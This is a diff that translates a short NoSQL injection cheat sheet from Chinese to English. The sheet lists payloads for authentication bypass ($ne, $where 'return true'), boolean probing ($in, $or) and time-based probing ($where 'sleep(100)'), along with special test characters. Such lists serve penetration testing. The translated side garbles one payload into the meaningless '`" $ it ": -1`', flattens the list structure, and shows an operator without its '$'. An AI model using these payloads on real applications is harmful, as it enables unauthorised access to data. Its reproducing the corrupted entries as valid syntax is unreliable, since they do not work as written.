@@ -1,17 +1,17 @@
 NoSQL Payload
 ========================================
 
-常见Payload
+Common Payloads
 ----------------------------------------
-- 绕过限制条件
-    - ``{"username": "user"}`` => ``{"username": {"ne": "fakeuser"}}``
-    - ``{"$where":  "return true"}``
-- 测试用字符
-    - ``'"\/$[].>``
-- 布尔测试常用
-    - ``{"$ne": -1}``
-    - ``{"$in": []}``
-    - ``{"$where":  "return true"}``
-    - ``{"$or": [{},{"foo":"1"}]}``
-- 时间
-    - ``{"$where":  "sleep(100)"}``
+- Bypassing restrictions
+- ``{"username": "user"}`` => ``{"username": {"ne": "fakeuser"}}``
+- ``{"$where":  "return true"}``
+- Test characters
+- ``'"\/$[].>``
+- Commonly used in Boolean testing
+- `` `" $ it ": -1` `
+- ``{"$in": []}``
+- ``{"$where":  "return true"}``
+- ``{"$or": [{},{"foo":"1"}]}``
+- time
+- ``{"$where":  "sleep(100)"}``
